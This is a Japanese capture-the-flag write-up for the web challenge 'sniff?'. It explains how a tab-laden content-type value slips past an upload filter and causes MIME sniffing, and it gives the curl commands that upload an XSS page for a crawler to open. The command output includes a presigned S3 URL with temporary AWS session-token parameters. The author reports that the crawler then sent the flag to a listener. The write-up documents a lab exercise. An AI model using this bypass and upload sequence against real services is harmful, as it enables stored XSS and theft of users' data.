# sniff?:Advanced:150pts

- [Target](https://d25jbnwf59t432.cloudfront.net/)  

**source code**  

- [Web Application](https://drive.google.com/file/d/1rJLMrJ9WVKGb4sr8Em9eKga8QWLG49EX/view?usp=drive_link)  

※ If no announcement is made, all "Crawler" source codes are the same.(scenario1)  

[https://d25jbnwf59t432.cloudfront.net/](https://d25jbnwf59t432.cloudfront.net/)  

# Solution
URLとアプリケーションのソースが渡される。  
クローラは[Server Side Upload](../Server_Side_Upload)と同様なようだ。  
URLにアクセスする同様のファイルアップロードサイトのようだ。  
![site.png](site/site.png)  
ソースの主要箇所は以下であった。  
```ts
~~~
server.post<{
  Body: {
    contentType: string;
    length: number;
  };
}>('/api/upload', async (request, reply) => {
  if (!request.body.contentType || !request.body.length) {
    return reply.code(400).send({ error: 'No file uploaded' });
  }

  if (request.body.length > 1024 * 1024 * 100) {
    return reply.code(400).send({ error: 'File too large' });
  }

  const denyStrings = new RegExp('[;,="\'()]');

  if (denyStrings.test(request.body.contentType)) {
    return reply.code(400).send({ error: 'Invalid content type' });
  }

  if (!request.body.contentType.startsWith('image') || !['jpeg', 'jpg', 'png', 'gif'].includes(request.body.contentType.split('/')[1])) {
    return reply.code(400).send({ error: 'Invalid image type' });
  }

  const filename = uuidv4();
  const s3 = new S3Client({});
  const command = new PutObjectCommand({
    Bucket: process.env.BUCKET_NAME,
    Key: `upload/${filename}`,
    ContentType: `${request.body.contentType.split('/')[0]}/${request.body.contentType.split('/')[1]}`,
  });

  const url = await getSignedUrl(s3, command, {
    expiresIn: 60 * 60 * 24,
    signableHeaders: new Set(['content-type']),
  });
  return reply.header('content-type', 'application/json').send({
    url,
    filename,
  });
});
~~~
```
`contentType`がチェックされており、正規表現`'[;,="\'()]'`に含まれたものは使えない。  
`startsWith('image')`なので文字列で`image`から始まる必要がある。  
さらに`['jpeg', 'jpg', 'png', 'gif'].includes(request.body.contentType.split('/')[1])`により`/`以降の文字列が画像である必要もある。  
また、最終的に`${request.body.contentType.split('/')[0]}/${request.body.contentType.split('/')[1]}`が`ContentType`となるので`/`を複数入れても意味がない。  
要するに`image[何らかの文字列]/png`とする必要がありそうだ。  
いろいろと試行錯誤していると`image\u0009text\\html\u0009/png`の際にXSSが発動した。  
なぜだかわからないがあまりにも`contentType`が狂っていると、MIMEスニッフィングが行われるようだ。  
以下のようにServer Side Uploadと同じ、XSSを含むHTMLをアップロードする。  
```bash
$ curl -X POST -H 'Content-Type: application/json' -d '{"contentType":"image\u0009text\\html\u0009/png","length":221}' --upload-file xs3.html 'https://d25jbnwf59t432.cloudfront.net/api/upload'
{"url":"https://uploadbucket-5b1bc63390-adv-2-upload.s3.ap-northeast-1.amazonaws.com/upload/f1b64093-7988-4f3a-967f-6ecfed36e322?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAUPVKPCT4N6PTWN6G%2F20240329%2Fap-northeast-1%2Fs3%2Faws4_request&X-Amz-Date=20240329T082711Z&X-Amz-Expires=86400&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEND%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLW5vcnRoZWFzdC0xIkcwRQIhAOo7zbG1I%2BNtbupSXcfsV1bLnAsFFxtnIh8oKWlCLrVOAiBkvoxqpzVlI01Rm0xVzi8vZsIjhsewGladyf0ippXUfiqtAwjq%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAEaDDMwODUyMTQwNzczNiIM9NMc3UcP7bO3aBxVKoEDh92Uizj9m8MJvmLu74BR%2FrXa7RlVPbfFCX24Elp0LoKy7Fw0TkXXYa9XRiS1L4fcpLIRxtmn69kgWCv5DnuO6p8sBwtL%2BVXdTsRsKYxA0fh1T9LZh7kVl8Oid6v2YhK%2BwNhoE%2F46FXl%2Bg3UfzU5rSt0PhkF5Ip%2BvTTZ4Ew%2B%2FNTY06IlRrjRwljYDWsbeWiUKv8fL1YbLjbhbshjOCdCCCTqddv6JE24UmioTUTpvwO4YlucpCfV1lsXxKEBNk5FiSkMfHx4G4XyT0Fcm0I3mbuI%2BOuGP41YFet503302CT0Pxy%2B4J1X1ub1IF6bSwPoDyPf28QG%2BkxGkM0B80EZfFABWbmd2o6ifVyEdKsqjXHFcZ4iosNH6Dv4A5Dhgra%2BxQvjhLwi4AnjR1aE8yhJ4MlrxH63pgJEgIppDHjV71UvKdFjZLNVXpXo3asANVLkFUvNbuCGXWCI7Icb2XaixHq9oaQaqnvfiB3hIR0yM3AXVOIkAoPI0GbP%2FjvtImWqvTDDd9pmwBjqdAQp4vitpaFYofVMS0bySg7TppWLUG%2BuVjsVWmF7ir4U1auAnp%2BqkqxD4eEFmKGmVNNrSU5PJS53oFHpL3OaChcVUYOHM9lnFqXTnI%2FUxt9qKEw%2FwvaUde6iYnO5%2FtovCJ7YOg1DFCMbumrjKVaTUh7iGTaINgYOt8QrOvlRYTAMsJwNwiNMiNg3F3wY2N8XBDow3Em9w6bj3EYnIUzk%3D&X-Amz-Signature=ce728694851343b36c8d0a3bb1f2dc14b132812c0a808186f5cb87c905a7760d&X-Amz-SignedHeaders=content-type%3Bhost&x-id=PutObject","filename":"f1b64093-7988-4f3a-967f-6ecfed36e322"}
$ curl -X PUT -H $'Content-Type: image\ttext\\html\t/png' --upload-file xs3.html 'https://uploadbucket-5b1bc63390-adv-2-upload.s3.ap-northeast-1.amazonaws.com/upload/f1b64093-7988-4f3a-967f-6ecfed36e322?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAUPVKPCT4N6PTWN6G%2F20240329%2Fap-northeast-1%2Fs3%2Faws4_request&X-Amz-Date=20240329T082711Z&X-Amz-Expires=86400&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEND%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLW5vcnRoZWFzdC0xIkcwRQIhAOo7zbG1I%2BNtbupSXcfsV1bLnAsFFxtnIh8oKWlCLrVOAiBkvoxqpzVlI01Rm0xVzi8vZsIjhsewGladyf0ippXUfiqtAwjq%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAEaDDMwODUyMTQwNzczNiIM9NMc3UcP7bO3aBxVKoEDh92Uizj9m8MJvmLu74BR%2FrXa7RlVPbfFCX24Elp0LoKy7Fw0TkXXYa9XRiS1L4fcpLIRxtmn69kgWCv5DnuO6p8sBwtL%2BVXdTsRsKYxA0fh1T9LZh7kVl8Oid6v2YhK%2BwNhoE%2F46FXl%2Bg3UfzU5rSt0PhkF5Ip%2BvTTZ4Ew%2B%2FNTY06IlRrjRwljYDWsbeWiUKv8fL1YbLjbhbshjOCdCCCTqddv6JE24UmioTUTpvwO4YlucpCfV1lsXxKEBNk5FiSkMfHx4G4XyT0Fcm0I3mbuI%2BOuGP41YFet503302CT0Pxy%2B4J1X1ub1IF6bSwPoDyPf28QG%2BkxGkM0B80EZfFABWbmd2o6ifVyEdKsqjXHFcZ4iosNH6Dv4A5Dhgra%2BxQvjhLwi4AnjR1aE8yhJ4MlrxH63pgJEgIppDHjV71UvKdFjZLNVXpXo3asANVLkFUvNbuCGXWCI7Icb2XaixHq9oaQaqnvfiB3hIR0yM3AXVOIkAoPI0GbP%2FjvtImWqvTDDd9pmwBjqdAQp4vitpaFYofVMS0bySg7TppWLUG%2BuVjsVWmF7ir4U1auAnp%2BqkqxD4eEFmKGmVNNrSU5PJS53oFHpL3OaChcVUYOHM9lnFqXTnI%2FUxt9qKEw%2FwvaUde6iYnO5%2FtovCJ7YOg1DFCMbumrjKVaTUh7iGTaINgYOt8QrOvlRYTAMsJwNwiNMiNg3F3wY2N8XBDow3Em9w6bj3EYnIUzk%3D&X-Amz-Signature=ce728694851343b36c8d0a3bb1f2dc14b132812c0a808186f5cb87c905a7760d&X-Amz-SignedHeaders=content-type%3Bhost&x-id=PutObject'
```
アップロードに成功したら`https://d25jbnwf59t432.cloudfront.net/upload/f1b64093-7988-4f3a-967f-6ecfed36e322`をクローラへ投げてやる。  
すると以下のリクエストを受け取る。  
```
GET
/?satoki=flag=flag{c4ca4238a0b923820dcc509a6f75849b}
```
flagが得られた。  

## flag{c4ca4238a0b923820dcc509a6f75849b}